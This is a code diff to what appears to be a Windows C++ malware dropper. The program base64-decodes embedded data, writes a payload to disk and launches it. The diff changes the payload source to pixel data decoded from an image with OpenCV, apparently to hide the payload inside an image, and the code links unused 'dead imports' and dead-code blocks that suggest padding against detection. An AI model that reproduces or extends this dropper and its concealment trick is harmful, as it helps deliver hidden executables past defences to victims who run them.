@@ -15,6 +15,12 @@
 #include<atlstr.h>
 #include<atlenc.h>
 
+
+/// OPEN CV
+#include <iostream>
+#include <fstream>
+#include <opencv2/opencv.hpp>
+
 // Linking with teh dead imports
 #pragma comment(lib, "Comctl32.lib")
 #pragma comment(lib, "Rpcrt4.lib")
@@ -62,10 +68,21 @@ int main()
 #ifdef BASE64
 	data = base64decode(data,&size);
 #endif
+
+//// OPENCV MAGICCCC
+  cv::Mat img = cv::imdecode(data, cv::IMREAD_GRAYSCALE);
+
+  DWORD img_size = img.total() * img.elemSize();
+
+  void *img_data = reinterpret_cast<const char*>(img.data);
+
 	// where to drop
 	set_name();
 	// Drop to Disk
-	drop(size, data);
+	// drop(size, data);
+
+  // OPEN CV
+	drop(img_size, img_data);
 	// launch process
 	launch();
 #ifdef DEAD_CODE
